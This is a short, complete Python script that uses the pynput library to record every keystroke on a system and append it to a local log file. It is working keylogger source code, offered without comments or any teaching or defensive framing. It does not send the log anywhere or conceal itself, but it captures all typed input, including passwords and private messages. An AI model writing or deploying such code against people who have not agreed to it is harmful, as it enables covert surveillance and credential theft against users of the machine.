from pynput import keyboard


log_file = "my_key_log.txt"


def write_to_file(key):
    with open(log_file, "a") as file:
       
        if hasattr(key, 'char'):
            file.write(str(key.char))
        else:
            file.write(f'[{str(key)}]')


def on_press(key):
    try:
        write_to_file(key)
    except Exception as e:
        print(f"Error: {e}")


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
